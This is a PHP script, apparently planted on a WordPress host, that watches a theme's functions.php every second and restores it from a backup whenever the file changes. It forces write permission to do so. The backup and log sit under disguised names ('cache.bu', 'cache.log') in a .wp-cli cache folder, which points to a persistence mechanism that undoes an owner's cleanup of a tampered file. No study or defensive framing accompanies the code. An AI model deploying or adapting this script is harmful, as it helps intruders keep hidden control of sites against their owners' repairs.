<?php
// a.php - VERSI OPTIMASI
// Perubahan: interval 1 detik, langsung restore, cache hash backup

$file_asli   = '	/home/chiacundippal/public_html/web/wp-content/themes/experon/functions.php';
$file_backup = '/home/chiacundippal/.wp-cli/cache/cache.bu';
$log_file    = '/home/chiacundippal/.wp-cli/cache/cache.log';

// ===== KONFIGURASI =====
$waktu_tunggu   = 0;  // 0 = langsung restore, >0 = tunggu N detik dulu
$interval_cek   = 1;  // Cek setiap 1 detik (lebih cepat dari 5 detik)
$max_log_size   = 5 * 1024 * 1024; // Rotasi log jika >5MB
// =======================

function tulis_log($log_file, $pesan, $max_log_size) {
    // Rotasi log otomatis agar tidak membengkak
    if (file_exists($log_file) && filesize($log_file) > $max_log_size) {
        rename($log_file, $log_file . '.lama');
    }
    file_put_contents($log_file, date('[Y-m-d H:i:s] ') . $pesan . "\n", FILE_APPEND);
}

function restore_file($file_asli, $file_backup, $log_file, $max_log_size) {
    // Set permission agar bisa di-overwrite jika perlu
    if (!is_writable($file_asli)) {
        chmod($file_asli, 0644);
    }
    if (copy($file_backup, $file_asli)) {
        // Paksa clear stat cache supaya hash langsung fresh
        clearstatcache(true, $file_asli);
        tulis_log($log_file, "✅ FILE DI-RESTORE ke versi backup.", $max_log_size);
    } else {
        tulis_log($log_file, "❌ GAGAL restore! Cek permission file.", $max_log_size);
    }
}

tulis_log($log_file, "🚀 Watcher dimulai. Interval: {$interval_cek}s | Waktu tunggu: {$waktu_tunggu}s", $max_log_size);

// Cache hash backup sekali di awal (backup tidak berubah, tidak perlu dihitung ulang)
$hash_backup = md5_file($file_backup);
if (!$hash_backup) {
    tulis_log($log_file, "❌ FATAL: File backup tidak ditemukan! Watcher berhenti.", $max_log_size);
    exit(1);
}

$sedang_menunggu = false;
$waktu_deteksi   = 0;

while (true) {
    clearstatcache(true, $file_asli); // Paksa baca dari disk, bukan cache PHP
    $hash_asli = md5_file($file_asli);

    if (!$hash_asli) {
        tulis_log($log_file, "⚠️ File asli tidak bisa dibaca/hilang!", $max_log_size);
        copy($file_backup, $file_asli);
        sleep($interval_cek);
        continue;
    }

    $ada_perubahan = ($hash_asli !== $hash_backup);

    if ($ada_perubahan && !$sedang_menunggu) {
        tulis_log($log_file, "🔴 PERUBAHAN TERDETEKSI!", $max_log_size);

        if ($waktu_tunggu > 0) {
            $sedang_menunggu = true;
            $waktu_deteksi   = time();
            tulis_log($log_file, "⏳ Menunggu {$waktu_tunggu} detik sebelum restore...", $max_log_size);
        } else {
            // Langsung restore tanpa jeda
            restore_file($file_asli, $file_backup, $log_file, $max_log_size);
        }
    }

    // Jika sedang dalam mode tunggu
    if ($sedang_menunggu) {
        $sudah_menunggu = time() - $waktu_deteksi;

        if (!$ada_perubahan) {
            // File sudah dikembalikan manual sebelum waktu habis
            tulis_log($log_file, "✅ File dikembalikan manual. Restore dibatalkan.", $max_log_size);
            $sedang_menunggu = false;
        } elseif ($sudah_menunggu >= $waktu_tunggu) {
            // Waktu tunggu habis, lakukan restore
            restore_file($file_asli, $file_backup, $log_file, $max_log_size);
            $sedang_menunggu = false;
        }
    }

    sleep($interval_cek);
}
?>
